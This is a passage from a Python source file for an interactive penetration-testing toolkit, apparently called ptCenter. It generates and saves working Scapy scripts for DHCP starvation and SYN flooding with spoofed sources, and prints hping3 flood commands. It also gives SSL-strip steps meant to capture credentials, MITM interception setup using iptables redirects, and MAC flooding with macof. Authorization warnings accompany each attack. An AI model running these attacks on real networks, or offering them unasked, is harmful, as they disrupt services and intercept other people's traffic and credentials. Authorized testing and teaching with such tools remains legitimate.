              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac) / \
              DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, iface=interface, verbose=False)
        print(f"Sent DHCP Discover from {{mac}}")

if __name__ == "__main__":
    dhcp_starvation("{interface}")
"""
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        script_path.chmod(0o755)
        
        print(f"  sudo python3 {script_path}")
        print(f"\n{Colors.SUCCESS}✓ Script saved to: {script_path}{Colors.RESET}")
    
    def syn_flood(self):
        """SYN flood attack"""
        print(f"\n{Colors.HEADER}💣 SYN Flood Attack (DoS){Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This is a Denial of Service attack. Use only on authorized systems!{Colors.RESET}\n")
        
        if not self.check_tool_installed("hping3"):
            print(f"{Colors.ERROR}✗ hping3 is not installed")
            print(f"{Colors.INFO}Install: sudo apt install hping3")
            return
        
        target_ip = input(f"{Colors.PROMPT}[+] Enter target IP: {Colors.RESET}").strip()
        target_port = input(f"{Colors.PROMPT}[+] Enter target port: {Colors.RESET}").strip()
        
        if not target_ip or not target_port:
            print(f"{Colors.ERROR}✗ Target IP and port are required")
            return
        
        print(f"\n{Colors.INFO}SYN Flood Attack Options:")
        print(f"\n{Colors.MENU}1. Basic SYN Flood:{Colors.RESET}")
        print(f"  sudo hping3 -S {target_ip} -p {target_port} --flood --rand-source")
        
        print(f"\n{Colors.MENU}2. Controlled SYN Flood (with packet rate):{Colors.RESET}")
        print(f"  sudo hping3 -S {target_ip} -p {target_port} --faster --rand-source")
        
        print(f"\n{Colors.MENU}3. Using Scapy:{Colors.RESET}")
        script_path = self.output_dir / "syn_flood.py"
        
        script_content = f"""#!/usr/bin/env python3
from scapy.all import *
import random

def syn_flood(target_ip, target_port, count=1000):
    for i in range(count):
        src_ip = ".".join(map(str, (random.randint(0,255) for _ in range(4))))
        src_port = random.randint(1024, 65535)
        
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=int(target_port), flags="S")
        send(pkt, verbose=False)
        
        if i % 100 == 0:
            print(f"Sent {{i}} packets...")
    
    print(f"Sent {{count}} SYN packets to {{target_ip}}:{{target_port}}")

if __name__ == "__main__":
    syn_flood("{target_ip}", {target_port})
"""
        
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        script_path.chmod(0o755)
        
        print(f"  sudo python3 {script_path}")
        print(f"\n{Colors.SUCCESS}✓ Script saved to: {script_path}{Colors.RESET}")
        
        print(f"\n{Colors.WARNING}⚠ Legal Notice: DoS attacks are illegal without authorization!")
    
    def ssl_strip(self):
        """SSL Strip attack setup"""
        print(f"\n{Colors.HEADER}🔓 SSL Strip Attack{Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This downgrades HTTPS to HTTP. Use only on authorized networks!{Colors.RESET}\n")
        
        if not self.check_tool_installed("sslstrip"):
            print(f"{Colors.ERROR}✗ SSLStrip is not installed")
            print(f"{Colors.INFO}Install: pip install sslstrip")
            return
        
        interface = input(f"{Colors.PROMPT}[+] Enter network interface: {Colors.RESET}").strip()
        
        if not interface:
            print(f"{Colors.ERROR}✗ Interface is required")
            return
        
        print(f"\n{Colors.INFO}SSL Strip Attack Setup:")
        print(f"\n{Colors.MENU}Step 1: Enable IP forwarding{Colors.RESET}")
        print(f"  echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        print(f"\n{Colors.MENU}Step 2: Setup iptables redirect{Colors.RESET}")
        print(f"  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
        
        print(f"\n{Colors.MENU}Step 3: Run SSLStrip{Colors.RESET}")
        print(f"  sslstrip -l 8080")
        
        print(f"\n{Colors.MENU}Step 4: Perform ARP spoofing{Colors.RESET}")
        print(f"  (Use the ARP spoofing module)")
        
        print(f"\n{Colors.INFO}Captured credentials will be logged to sslstrip.log")
        
        # Save setup instructions
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        config_file = self.output_dir / f"sslstrip_setup_{timestamp}.txt"
        
        with open(config_file, 'w') as f:
            f.write("SSL Strip Attack Setup\n")
            f.write("=" * 75 + "\n")
            f.write(f"Interface: {interface}\n")
            f.write(f"Generated: {datetime.now()}\n\n")
            f.write("Commands:\n")
            f.write("1. echo 1 > /proc/sys/net/ipv4/ip_forward\n")
            f.write("2. iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n")
            f.write("3. sslstrip -l 8080\n")
            f.write("4. Perform ARP spoofing\n")
        
        print(f"\n{Colors.SUCCESS}✓ Setup saved to: {config_file}{Colors.RESET}")
    
    def mitm_setup(self):
        """Man-in-the-Middle attack setup"""
        print(f"\n{Colors.HEADER}🎭 Man-in-the-Middle (MITM) Attack Setup{Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This will intercept network traffic. Use only on authorized networks!{Colors.RESET}\n")
        
        if not self.check_tool_installed("mitmproxy"):
            print(f"{Colors.ERROR}✗ mitmproxy is not installed")
            print(f"{Colors.INFO}Install: pip install mitmproxy")
            return
        
        print(f"{Colors.INFO}MITM Tools Available:")
        print(f"\n{Colors.MENU}1. mitmproxy{Colors.RESET} - Interactive console")
        print(f"{Colors.MENU}2. mitmweb{Colors.RESET} - Web interface")
        print(f"{Colors.MENU}3. mitmdump{Colors.RESET} - Command-line packet capture")
        
        choice = input(f"\n{Colors.PROMPT}[+] Select tool [1-3]: {Colors.RESET}").strip()
        
        port = input(f"{Colors.PROMPT}[+] Enter proxy port [8080]: {Colors.RESET}").strip() or "8080"
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"mitm_capture_{timestamp}"
        
        if choice == "1":
            command = f"mitmproxy -p {port}"
        elif choice == "2":
            command = f"mitmweb -p {port}"
        elif choice == "3":
            command = f"mitmdump -p {port} -w {output_file}.mitm"
        else:
            print(f"{Colors.ERROR}✗ Invalid selection")
            return
        
        print(f"\n{Colors.INFO}Setup Steps:")
        print(f"\n{Colors.MENU}1. Start MITM proxy:{Colors.RESET}")
        print(f"  {command}")
        
        print(f"\n{Colors.MENU}2. Configure target device proxy settings:{Colors.RESET}")
        print(f"  Proxy IP: [Your IP]")
        print(f"  Proxy Port: {port}")
        
        print(f"\n{Colors.MENU}3. Install mitmproxy certificate on target device:{Colors.RESET}")
        print(f"  http://mitm.it")
        
        print(f"\n{Colors.INFO}💡 Alternatively, use ARP spoofing + transparent proxy mode:")
        print(f"  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port {port}")
        print(f"  iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port {port}")
        print(f"  mitmproxy --mode transparent -p {port}")
    
    def network_sniffing(self):
        """Network traffic sniffing"""
        print(f"\n{Colors.HEADER}🕵️  Network Sniffing{Colors.RESET}")
        
        has_tcpdump = self.check_tool_installed("tcpdump")
        has_tshark = self.check_tool_installed("tshark")
        
        if not (has_tcpdump or has_tshark):
            print(f"{Colors.ERROR}✗ No packet capture tools installed")
            print(f"{Colors.INFO}Install: sudo apt install tcpdump wireshark")
            return
        
        interface = input(f"{Colors.PROMPT}[+] Enter network interface: {Colors.RESET}").strip()
        
        if not interface:
            print(f"{Colors.ERROR}✗ Interface is required")
            return
        
        print(f"\n{Colors.INFO}Capture Options:")
        print(f"{Colors.MENU}1{Colors.RESET} - Capture all traffic")
        print(f"{Colors.MENU}2{Colors.RESET} - Capture HTTP traffic")
        print(f"{Colors.MENU}3{Colors.RESET} - Capture DNS queries")
        print(f"{Colors.MENU}4{Colors.RESET} - Capture specific host")
        print(f"{Colors.MENU}5{Colors.RESET} - Custom filter")
        
        choice = input(f"\n{Colors.PROMPT}[+] Select option: {Colors.RESET}").strip()
        
        filters = {
            "1": "",
            "2": "tcp port 80",
            "3": "udp port 53",
        }
        
        if choice in ["1", "2", "3"]:
            capture_filter = filters[choice]
        elif choice == "4":
            host = input(f"{Colors.PROMPT}[+] Enter host IP: {Colors.RESET}").strip()
            capture_filter = f"host {host}"
        elif choice == "5":
            capture_filter = input(f"{Colors.PROMPT}[+] Enter BPF filter: {Colors.RESET}").strip()
        else:
            print(f"{Colors.ERROR}✗ Invalid selection")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"capture_{timestamp}.pcap"
        
        if has_tcpdump:
            command = f"tcpdump -i {interface} {capture_filter} -w {output_file}"
        else:
            command = f"tshark -i {interface} {capture_filter} -w {output_file}"
        
        print(f"\n{Colors.INFO}Starting packet capture...")
        print(f"{Colors.MENU}Command: {command}{Colors.RESET}")
        print(f"\n{Colors.WARNING}Press Ctrl+C to stop capture{Colors.RESET}")
        print(f"{Colors.INFO}Packets will be saved to: {output_file}{Colors.RESET}")
        
        print(f"\n{Colors.INFO}💡 Analyze captured packets with:")
        print(f"  wireshark {output_file}")
        print(f"  tcpdump -r {output_file}")
    
    def mac_flooding(self):
        """MAC address flooding attack"""
        print(f"\n{Colors.HEADER}🌊 MAC Flooding Attack{Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This will overflow switch CAM table. Use only on authorized networks!{Colors.RESET}\n")
        
        if not self.check_tool_installed("macof"):
            print(f"{Colors.ERROR}✗ macof is not installed")
            print(f"{Colors.INFO}Install: sudo apt install dsniff")
            return
        
        interface = input(f"{Colors.PROMPT}[+] Enter network interface: {Colors.RESET}").strip()
        
        if not interface:
            print(f"{Colors.ERROR}✗ Interface is required")
            return
        
        print(f"\n{Colors.INFO}Starting MAC flooding attack...")
        print(f"\n{Colors.MENU}Run this command:{Colors.RESET}")
        print(f"  sudo macof -i {interface}")
        
        print(f"\n{Colors.INFO}This will flood the switch with random MAC addresses")
        print(f"{Colors.INFO}causing it to enter 'hub mode' and broadcast all traffic")
        
        print(f"\n{Colors.WARNING}⚠ Impact: Network performance degradation")
        print(f"{Colors.WARNING}⚠ Duration: Run for 30-60 seconds to fill CAM table{Colors.RESET}")
    
    # ========================================================================
    # SETTINGS AND CONFIGURATION
    # ========================================================================
    
    def settings_menu(self):
        """Application settings"""
        while True:
            print(f"\n{Colors.SEPARATOR}")
            print(f"{Colors.HEADER}           ⚙️  SETTINGS{Colors.RESET}")
            print(Colors.SEPARATOR)
            
            ai_status = "Enabled" if self.ai_manager.is_available() else "Disabled"
            
            print(f"""
{Colors.INFO}Current Configuration:{Colors.RESET}
  Output Directory: {self.output_dir}
  AI Status: {ai_status}
  AI Model: Google Gemini (gemini-3-flash-preview)
  Auto AI Analysis: {self.config.get('auto_ai_analysis', True)}

{Colors.MENU}1{Colors.RESET} - Toggle Auto AI Analysis
{Colors.MENU}2{Colors.RESET} - View Gemini API Setup Help
{Colors.MENU}3{Colors.RESET} - Clear Output Directory
{Colors.MENU}4{Colors.RESET} - View Logs
{Colors.MENU}5{Colors.RESET} - Back to Main Menu
""")
            print(Colors.SUBSEPARATOR)
            
            choice = input(f"{Colors.PROMPT}[+] Select option: {Colors.RESET}").strip()
            
            if choice == "1":
                self.toggle_auto_analysis()
            elif choice == "2":
                self.show_api_help()
            elif choice == "3":
                self.clear_output_directory()
            elif choice == "4":
                self.view_logs()
            elif choice == "5":
                break
            else:
                print(f"{Colors.ERROR}✗ Invalid option")
    
    def show_api_help(self):
        """Show Gemini API configuration help"""
        print(f"\n{Colors.HEADER}{'=' * 75}")
        print(f"{Colors.HEADER}GEMINI API CONFIGURATION GUIDE{Colors.RESET}")
        print(f"{Colors.HEADER}{'=' * 75}{Colors.RESET}\n")
        
        print(f"{Colors.SUCCESS}🎉 GOOGLE GEMINI - 100% FREE!{Colors.RESET}\n")
        
        print(f"{Colors.INFO}Gemini offers a generous FREE tier:{Colors.RESET}")
        print(f"  ✅ 15 requests per minute")
        print(f"  ✅ 1 million tokens per day")
        print(f"  ✅ No credit card required")
        print(f"  ✅ No expiration\n")
        
        print(f"{Colors.HEADER}Setup Steps:{Colors.RESET}\n")
        print(f"{Colors.MENU}1.{Colors.RESET} Visit: {Colors.INFO}https://makersuite.google.com/app/apikey{Colors.RESET}")
        print(f"{Colors.MENU}2.{Colors.RESET} Sign in with your Google account")
        print(f"{Colors.MENU}3.{Colors.RESET} Click 'Create API Key'")
        print(f"{Colors.MENU}4.{Colors.RESET} Copy your API key")
        print(f"{Colors.MENU}5.{Colors.RESET} Create a .env file in the application directory:")
        print(f"\n{Colors.SUBSEPARATOR}")
        print(f"   GEMINI_API_KEY=your_api_key_here")
        print(f"{Colors.SUBSEPARATOR}\n")
        print(f"{Colors.MENU}6.{Colors.RESET} Restart ptCenter\n")
        
        print(f"{Colors.INFO}Example .env file:{Colors.RESET}")
        print(f"{Colors.SUBSEPARATOR}")
        print("# Google Gemini API Key (FREE)")
        print("GEMINI_API_KEY=AIzaSyC...")
        print(f"{Colors.SUBSEPARATOR}\n")
        
        print(f"{Colors.SUCCESS}💡 Pro Tips:{Colors.RESET}")
        print(f"  • Keep your API key private")
        print(f"  • Add .env to .gitignore if using version control")
        print(f"  • The free tier is very generous for pentesting use")
        print(f"  • No payment info required at any point\n")
        
        print(f"{Colors.WARNING}⚠ Security Note:{Colors.RESET}")
        print(f"  Never share your API key or commit it to public repositories!\n")
    
    def toggle_auto_analysis(self):
        """Toggle automatic AI analysis"""
        current = self.config.get("auto_ai_analysis", True)
        self.config["auto_ai_analysis"] = not current
        
        status = "enabled" if self.config["auto_ai_analysis"] else "disabled"
        print(f"{Colors.SUCCESS}✓ Auto AI analysis {status}{Colors.RESET}")
    
    def clear_output_directory(self):
        """Clear output directory"""
        confirm = input(f"{Colors.WARNING}⚠ Clear all files in {self.output_dir}? (yes/no): {Colors.RESET}").strip().lower()
        
        if confirm == "yes":
            import shutil
            shutil.rmtree(self.output_dir)
            self.output_dir.mkdir()
            print(f"{Colors.SUCCESS}✓ Output directory cleared{Colors.RESET}")
        else:
            print(f"{Colors.INFO}Operation cancelled")
    
    def view_logs(self):
        """View application logs"""
        log_file = Path("ptcenter.log")
        if log_file.exists():
            print(f"\n{Colors.INFO}Last 50 log entries:{Colors.RESET}\n")
            command = f"tail -n 50 {log_file}"
            self.run_command(command)
        else:
            print(f"{Colors.WARNING}⚠ No log file found{Colors.RESET}")
    
    # ========================================================================
    # MAIN INTERFACE
    # ========================================================================
    
    def display_banner(self):
        """Display application banner"""
        banner = f"""
{Colors.HEADER}{'=' * 75}
 ██████╗ ████████╗    ██████╗███████╗███╗   ██╗████████╗███████╗██████╗ 
 ██╔══██╗╚══██╔══╝   ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝   ██║      ██║     █████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝
 ██╔═══╝    ██║      ██║     ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
 ██║        ██║      ╚██████╗███████╗██║ ╚████║   ██║   ███████╗██║  ██║
 ╚═╝        ╚═╝       ╚═════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{'=' * 75}
    {Colors.SUCCESS}🔒 Advanced Penetration Testing with Gemini AI 🔒{Colors.RESET}
{Colors.HEADER}{'=' * 75}

{Colors.INFO}Developer:{Colors.RESET} Mahdi (@j0yb0y-m) | Enhanced by Claude
{Colors.INFO}Version:{Colors.RESET} 3.0 - Gemini Edition
{Colors.INFO}AI Model:{Colors.RESET} Google Gemini (gemini-3-flash-preview)
{Colors.INFO}Output:{Colors.RESET} {self.output_dir}
{Colors.INFO}AI Status:{Colors.RESET} {'✓ Gemini Enabled' if self.ai_manager.is_available() else '✗ Disabled (Set GEMINI_API_KEY)'}

{Colors.HEADER}{'=' * 75}{Colors.RESET}
"""
        print(banner)
    
    def display_menu(self):
        """Display main menu"""
        menu = f"""
{Colors.MENU}┌─────────────────────────────────────────────────────────────────────────┐
│                            MAIN MENU                                    │
├─────────────────────────────────────────────────────────────────────────┤
│  {Colors.MENU}1{Colors.RESET} ► {Colors.SUCCESS}Network Scanning{Colors.RESET}       - Port, service, and vulnerability scanning   │
│  {Colors.MENU}2{Colors.RESET} ► {Colors.INFO}OSINT Investigation{Colors.RESET}    - Open source intelligence gathering        │
│  {Colors.MENU}3{Colors.RESET} ► {Colors.WARNING}Vulnerability Info{Colors.RESET}     - CVE lookup and security analysis          │
│  {Colors.MENU}4{Colors.RESET} ► {Colors.ERROR}Exploit Development{Colors.RESET}    - Shells, payloads, and exploits            │
│  {Colors.MENU}5{Colors.RESET} ► {Colors.HEADER}Network Attacks{Colors.RESET}        - ARP, DNS, MITM, and DoS attacks          │
│  {Colors.MENU}6{Colors.RESET} ► {Colors.INFO}Settings{Colors.RESET}               - Configure AI models and options           │
│  {Colors.MENU}7{Colors.RESET} ► {Colors.ERROR}Exit{Colors.RESET}                  - Close application                         │
{Colors.MENU}└─────────────────────────────────────────────────────────────────────────┘{Colors.RESET}
"""
        print(menu)
    
    def run(self):
        """Main application loop"""
        try:
            self.display_banner()
            
            # Show quick tip
            if not self.ai_manager.is_available():
                print(f"{Colors.WARNING}💡 Tip: Configure AI API keys for enhanced analysis")
                print(f"{Colors.INFO}   See Settings > API Configuration Help{Colors.RESET}\n")
            
            while True:
                self.display_menu()
                
                choice = input(f"\n{Colors.PROMPT}[★] Select option: {Colors.RESET}").strip()
                
                if choice == "1":
                    self.scanner_menu()
                elif choice == "2":
                    self.osint_menu()
                elif choice == "3":
                    self.vulnerability_info()
                elif choice == "4":
                    self.exploit_menu()
                elif choice == "5":
                    self.network_attacks_menu()
                elif choice == "6":
                    self.settings_menu()
                elif choice == "7":
                    print(f"\n{Colors.SUCCESS}✓ Thank you for using ptCenter!")
                    print(f"{Colors.INFO}Stay safe and hack responsibly! 🔒")
                    print(f"{Colors.WARNING}⚠ Remember: Only test systems you have permission to test!{Colors.RESET}\n")
                    break
                else:
                    print(f"{Colors.ERROR}✗ Invalid option. Please select 1-7{Colors.RESET}")
                    
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}⚠ Interrupted by user")
            print(f"{Colors.INFO}Exiting gracefully...{Colors.RESET}\n")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Colors.ERROR}✗ Fatal error: {e}{Colors.RESET}")
            logger.critical(f"Fatal error: {e}", exc_info=True)
            sys.exit(1)


def main():
    """Application entry point"""
    print(f"{Colors.INFO}Initializing ptCenter...{Colors.RESET}")
    
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Colors.WARNING}⚠ Warning: Not running as root")
        print(f"{Colors.INFO}Some features require sudo/root privileges{Colors.RESET}\n")
    
    # Check Python version
    if sys.version_info < (3, 8):
        print(f"{Colors.ERROR}✗ Python 3.8 or higher is required")
        print(f"{Colors.INFO}Current version: {sys.version}{Colors.RESET}")
        sys.exit(1)
    
    app = PTCenter()
    app.run()


if __name__ == "__main__":
    main()
